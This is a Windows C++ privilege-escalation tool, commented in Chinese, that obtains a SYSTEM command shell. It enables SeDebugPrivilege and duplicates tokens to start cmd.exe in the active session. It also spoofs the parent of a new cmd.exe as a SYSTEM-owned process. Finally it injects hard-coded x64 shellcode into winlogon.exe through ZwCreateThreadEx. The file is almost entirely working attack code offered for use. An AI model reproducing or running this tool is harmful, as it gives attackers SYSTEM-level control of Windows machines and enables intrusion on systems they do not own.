
#include <windows.h>
#include <handleapi.h>
#include <processthreadsapi.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <cstdint>
#include <WinBase.h>

#include <userenv.h>
#include <wtsapi32.h>


#pragma comment(lib, "WtsApi32.lib")
#pragma comment(lib, "Userenv.lib") 

#ifdef _WIN64
// #define TH32CS_SNAPPROCESS  0x00000002
typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	LPVOID ObjectAttributes,
	HANDLE ProcessHandle,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	ULONG CreateThreadFlags,
	SIZE_T ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	LPVOID pUnkown);
#else
typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	LPVOID ObjectAttributes,
	HANDLE ProcessHandle,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	BOOL CreateSuspended,
	DWORD dwStackSize,
	DWORD dw1,
	DWORD dw2,
	LPVOID pUnkown);
#endif
/// <summary>
/// 根据错误代码，返回错误详情
/// </summary>
/// <param name="Text">要输出的字符串</param>
/// <returns>返回错误详情</returns>
PCSTR _FormatErrorMessage(char* Text)
{
	DWORD nErrorNo = GetLastError(); // 得到错误代码
	LPSTR lpBuffer;
	DWORD dwLen = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,
		nErrorNo,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language,
		(LPTSTR)&lpBuffer,
		0,
		NULL);
	if (dwLen == 0)
	{
		printf("[-] FormatMessage failed with %u\n", GetLastError());
	}
	if (lpBuffer) {
		printf("%s,ErrorCode:%u,Reason:%s \n", Text, nErrorNo, (LPCTSTR)lpBuffer);
	}
	return 0;
}

// 提权函数
BOOL EnableDebugPriv()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		_FormatErrorMessage("[-] EnableDebugPriv failed ");
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		_FormatErrorMessage("[-] EnableDebugPriv failed ");
		return FALSE;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL))
	{
		_FormatErrorMessage("[-] EnableDebugPriv failed.");
		CloseHandle(hToken);
		return FALSE;
	}
	else
	{
		printf("[+] AdjustTokenPrivileges successfully.\n");
		return TRUE;
	}
	return FALSE;
}

/// <summary>
/// 检查当前用户是否为SYSTEM
/// </summary>
/// <returns>SYSTEM -> TRUE </returns>
BOOL CurrentUserIsLocalSystem()
{
	BOOL bIsLocalSystem = FALSE;
	PSID psidLocalSystem;
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

	BOOL fSuccess = AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &psidLocalSystem);
	if (fSuccess)
	{
		fSuccess = CheckTokenMembership(0, psidLocalSystem, &bIsLocalSystem);
		FreeSid(psidLocalSystem);
	}
	return bIsLocalSystem;
}
/// <summary>
/// 检查是否为64位进程，返回true, 代表进程是32位，否则是64位
/// </summary>
/// <param name="hProcess"></param>
/// <returns></returns>
/// 如果该进程是32位进程，运行在64操作系统下，该值为True，否则为False。
/// 如果该进程是一个64位应用程序，运行在64位系统上，该值也被设置为False。
/// 如果该进程运行在32位系统下，该值会被设置为False
/// 可以用GetNativeSystemInfo(); 获得当前操作系统位数相关信息。
/// 
BOOL IsWow64(HANDLE hProcess)
{
	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;

	BOOL bIsWow64 = FALSE;
	HMODULE  hrkernel32 = GetModuleHandle("kernel32");
	if (NULL != hrkernel32) {
		fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(hrkernel32, "IsWow64Process");
		if (NULL != fnIsWow64Process)
		{
			fnIsWow64Process(hProcess, &bIsWow64);
		}
	}
	return bIsWow64;
}


/// <summary>
/// 模拟token创建在可视化桌面创建新进程
/// </summary>
/// <param name="lpCommand">cmdline</param>
/// <returns></returns>
DWORD _stdcall LaunchSessionProcess(LPTSTR lpCommand)
{
	DWORD dwRet = 0;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	DWORD dwSessionId;//当前会话的ID  
	HANDLE hUserToken = NULL;//当前登录用户的令牌  
	HANDLE hUserTokenDup = NULL;//复制的用户令牌  
	HANDLE hPToken = NULL;//进程令牌  
	DWORD dwCreationFlags;
	

	LPVOID pEnv = NULL;

	DWORD processId = GetCurrentProcessId(); //当前进程id
	DWORD pSessionId = 0; // 检索与指定进程关联的远程桌面服务会话。
	
	// 属性为 Console 没有GUI ，检索控制台会话的会话标识符
	dwSessionId = WTSGetActiveConsoleSessionId();  
	
	if (ProcessIdToSessionId(processId, &pSessionId)) {
		printf("[*] Process %u runs in session %u \n", processId, pSessionId);
	}
	else {
		printf("[-] ProcessIdToSessionId error: %d \n", GetLastError());
	}

	do
	{
		WTSQueryUserToken(dwSessionId, &hUserToken);//读取当前登录用户的令牌信息  
		dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;//创建参数  

		ZeroMemory(&si, sizeof(STARTUPINFO));
		ZeroMemory(&pi, sizeof(pi));

		si.cb = sizeof(STARTUPINFO);
		si.lpDesktop = "winsta0\\default";//指定创建进程的窗口站，Windows下唯一可交互的窗口站就是WinSta0\Default  

		TOKEN_PRIVILEGES tp;
		LUID luid;

		//打开进程令牌  
		if (!OpenProcessToken(GetCurrentProcess(),
			TOKEN_ADJUST_PRIVILEGES |
			TOKEN_QUERY |
			TOKEN_DUPLICATE |
			TOKEN_ASSIGN_PRIMARY |
			TOKEN_ADJUST_SESSIONID |
			TOKEN_READ |
			TOKEN_WRITE, &hPToken))
		{
			dwRet = GetLastError();
			break;
		}

		//查找DEBUG权限的UID  
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
		{
			dwRet = GetLastError();
			break;
		}

		//设置令牌信息  
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		//复制当前用户的令牌  
		if (!DuplicateTokenEx(hPToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification,
			TokenPrimary, &hUserTokenDup))
		{
			dwRet = GetLastError();
			break;
		}

		// 创建进程环境块，保证环境块是在用户桌面的环境下 ,
		// 指定是否继承当前进程的环境。如果此值为TRUE，则进程继承当前进程的环境。如果此值为FALSE，则进程不会继承当前进程的环境。
		if (CreateEnvironmentBlock(&pEnv, hUserTokenDup, TRUE))
		{
			dwCreationFlags |= CREATE_UNICODE_ENVIRONMENT;
		}
		else
		{
			pEnv = NULL;
		}


		//检查当前session是否为活动
		DWORD i,count = 0;
		PWTS_SESSION_INFO Session;
		// WTS_SESSION_INFO *Session;
		if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &Session, &count)) {
			printf("[*] Sessions: %d \n", count);
			for (i = 0; i < count; i++)
			{
				printf("[*] \tpWinStationName: %s ,SessionId: %d ,State: %d \n", Session[i].pWinStationName, Session[i].SessionId, Session[i].State);

				// 通过进程ID获取GUI的SessionID,解决在两个RDP用户在线时都弹出SYSTEM窗口
				if (Session[i].State == WTSActive && Session[i].SessionId == pSessionId)
				{
					//设置当前进程的令牌信息  
					if (!SetTokenInformation(hUserTokenDup, TokenSessionId, &Session[i].SessionId, sizeof(&Session[i].SessionId)))
					{
						dwRet = GetLastError();
						break;
					}

					//应用令牌权限  
					if (!AdjustTokenPrivileges(hUserTokenDup, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
						(PTOKEN_PRIVILEGES)NULL, NULL))
					{
						dwRet = GetLastError();
						break;
					}

					//创建用户进程  
					if (!CreateProcessAsUser(hUserTokenDup, NULL, lpCommand, NULL, NULL, FALSE,
						dwCreationFlags, pEnv, NULL, &si, &pi))
					{
						dwRet = GetLastError();
						break;
					}
					else {
						printf("[+] \t\tdwProcessId:%d\n", pi.dwProcessId);
						// Close process and thread handles. 
						CloseHandle(pi.hProcess);
						CloseHandle(pi.hThread);
					}
				}
			}
			
			if (Session)
			{
				WTSFreeMemory(Session);
			}
		
		}
		else
		{
			printf("[-] WTSEnumerateSessions error:%d \n",GetLastError());
			break;
		}

	} while (0);

	//关闭句柄  
	if (NULL != hUserToken)
	{
		CloseHandle(hUserToken);
	}

	if (NULL != hUserTokenDup)
	{
		CloseHandle(hUserTokenDup);
	}

	if (NULL != hPToken)
	{
		CloseHandle(hPToken);
	}

	if (NULL != pEnv) {
		DestroyEnvironmentBlock(pEnv); pEnv = NULL;
	}

	return dwRet;
}

/// <summary>
/// 注入system进程提权
/// </summary>
/// <param name="argc"></param>
/// <param name="argv"></param>
DWORD InjectSYSTEM(char* TarPorcess) {
	HANDLE hRemoteThread;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	uint8_t shellcode[] = {
		 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00, 0x54,
		 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
		 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
		 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
		 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
		 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99,
		 0xff, 0xc2, // inc edx (1 = SW_SHOW)
		 0xFF, 0xD7, 0x48, 0x83, 0xC4,
		 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3, 0x00
	};

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	int pid = -1;
	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {
			if (lstrcmpiA(entry.szExeFile, TarPorcess) == 0) {
				pid = entry.th32ProcessID;
				break;
			}
		}
	}
	CloseHandle(snapshot);

	if (pid < 0) {
		_FormatErrorMessage("[-] Could not find process");
		return -1;
	}
	

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc == NULL) {
		_FormatErrorMessage("[-] Could not open process");
		return -1;
	}

	// 都是x86或者x64时才进行注入，不同 时 使用其他注入方法
	if ( !(IsWow64(hProc) ^ IsWow64(GetCurrentProcess())) ) {
		printf("[*] Injecting shellcode in %s ...\n", TarPorcess);
	}
	else {
		///
		/// 32位注入64位
		/// 
		return -1;
	}
	
	LPVOID lpMem = VirtualAllocEx(hProc, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpMem == NULL) {
		_FormatErrorMessage("[-] Remote allocation failed");
		return -1;
	}
	if (!WriteProcessMemory(hProc, lpMem, shellcode, sizeof(shellcode), 0)) {
		_FormatErrorMessage("[-] Remote write failed");
		return -1;
	}
	
	/*if (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, 0, 0, 0)) {
		_FormatErrorMessage("[-] CreateRemoteThread failed");
		return -1;
	}*/


	HMODULE hNtdll = LoadLibrary("ntdll.dll");
	if (hNtdll == NULL)
	{
		printf("[!] LoadNTdll Error:%d\n", GetLastError());
		return FALSE;
	}
	else
	{
		printf("[*] Load ntdll.dll Successfully!\n");
	}
	
	typedef_ZwCreateThreadEx ZwCreateThreadEx = ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdll, "ZwCreateThreadEx");
	ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProc,
		(LPTHREAD_START_ROUTINE)lpMem, NULL, 0, 0, 0, 0, NULL);
	WaitForSingleObject(hRemoteThread, 2000);

	printf("[+] Success! :) \n");
	Sleep(1000);
	return 0;
}

DWORD SetParent(int pid) {
	HANDLE pHandle = NULL;
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T size = 0;
	BOOL ret;

	if (pid < 0) {
		printf("[-] Could not find process");
		return -1;
	}
	
	// Open the process which we will inherit the handle from
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)) == 0) {
		printf("[-] Error opening PID %d\n", pid);
		return -1;
	}

	// Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);

	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// Finally, create the process
	ret = CreateProcessA(
		NULL,
		"\"C:\\Windows\\system32\\cmd.exe\"",
		NULL,
		NULL,
		true,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		reinterpret_cast<LPSTARTUPINFOA>(&si),
		&pi
	);

	//关闭句柄  
	if (NULL != pi.hProcess)
	{
		CloseHandle(pi.hProcess);
	}

	if (NULL != pi.hThread)
	{
		CloseHandle(pi.hThread);
	}


	if (ret == false) {
		printf("[-] Error creating new process (%d)\n", GetLastError());
		return -1;
	}
	return 0;
}


// 通过进程Token获取进程权限类型
DWORD __stdcall EnumOwner(HANDLE htoken)
{
	DWORD dwLen;
	PSID pSid = 0;
	TOKEN_USER* pWork;
	SID_NAME_USE use;
	TCHAR User[256], Domain[256];

	GetTokenInformation(htoken, TokenUser, NULL, 0, &dwLen);
	pWork = (TOKEN_USER*)LocalAlloc(LMEM_ZEROINIT, dwLen);
	if (NULL == pWork) {
		return 0;
	}
	if (GetTokenInformation(htoken, TokenUser, pWork, dwLen, &dwLen))
	{
		dwLen = GetLengthSid(pWork->User.Sid);
		pSid = (PSID)LocalAlloc(LMEM_ZEROINIT, dwLen);
		if (NULL == pSid) {
			return 0;
		}
		CopySid(dwLen, pSid, pWork->User.Sid);
		dwLen = 256;
		LookupAccountSid(NULL, pSid, &User[0], &dwLen, &Domain[0], &dwLen, &use);
		
		if (lstrcmpiA(User, "SYSTEM") == 0) {
			// printf("\t 权限类型 => %s : %s \n", Domain, User);
			return -1;
		}
	}
	return 0;
}

// 

/// <summary>
/// 枚举系统中进程的令牌权限信息，成功返回0，失败返回 -1 
/// </summary>
/// <returns></returns>
int enumprocess()
{
	HANDLE SnapShot, ProcessHandle, hToken;
	PROCESSENTRY32 pe32;

	// 拍摄快照
	SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(SnapShot, &pe32) == FALSE)
		return -1;

	while (1)
	{
		if (Process32Next(SnapShot, &pe32) == FALSE)
			return -1;

		// printf("PID => %6i \t 进程名 => %-20s \t 线程数 => %3i", pe32.th32ProcessID, pe32.szExeFile, pe32.cntThreads);
		// 获取特定进程权限等
		ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pe32.th32ProcessID);
		if (ProcessHandle != NULL)
		{
			if (OpenProcessToken(ProcessHandle, TOKEN_QUERY, &hToken))
			{
				if (EnumOwner(hToken)) {
					printf("[*] Set Parent ProcessName => %s PID => %i \n", pe32.szExeFile, pe32.th32ProcessID );
					// 设置父进程 启动CMD
					if (!SetParent(pe32.th32ProcessID)) {
						CloseHandle(hToken);
						CloseHandle(ProcessHandle);
						break;
					}
				}
				CloseHandle(hToken);
				CloseHandle(ProcessHandle);
			}
		}
		// printf("\n");
	}
	return 0;
}

int main(int argc, char* argv[])
{

	HANDLE Mutexlock;
	// 获取调试权限
	if (!EnableDebugPriv()) {
		return -1;
	}

	Mutexlock = CreateMutex(NULL, FALSE, "938afa458ce812f897d936a1312cae687878a8a2");// 创建互斥量 
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		if (Mutexlock != 0) {
			CloseHandle(Mutexlock);
		}
		Mutexlock = NULL;
	}
	else {

		/// <summary>
		/// 1. 已经是SYSTEM就直接复制token创建新进程，
		/// 某些系统上执行会返回服务无法响应(用于替换服务程序进行提权测试的，有时候需要编写真正的服务程序以响应服务控制请求。) 
		/// </summary>
		/// <param name="argc"></param>
		/// <param name="argv"></param>
		/// <returns></returns>
		if (CurrentUserIsLocalSystem()) {
			DWORD  Rt = 0;
			printf("[+] You are already LocalSystem. \n");
			printf("[*] Launch Process ... \n" );
			LaunchSessionProcess(const_cast<char*>("C:\\Windows\\System32\\cmd.exe"));
			if (Rt) {
				printf("[-] Error Code: %d \n",Rt);
			}
			return 0;
		}

		//2. 枚举进程信息,通过token信息中的权限字段寻找SYSTEM权限进程，将该进程设置为父进程(x86和x64通用)。
		if (!enumprocess()) {
			return 0;
		}


		//3. 注入会话层 system 进程（需要相同架构的程序 x64-x64）。  
		char* TarPorcess;
		if ((int)argc == 2) {
			TarPorcess = argv[1];
		}
		else {
			TarPorcess = "winlogon.exe";
		}

		SYSTEM_INFO info;
		GetNativeSystemInfo(&info);
		if (info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
			// It's a 64-bit OS
			if (!InjectSYSTEM(TarPorcess)) {
				return 0;
			}
		}
		else {
			// 32位 shellcode还没准备好，先忽略32位系统的注入
			printf("[-] x86 OS");
		}
	}

	return 0;
}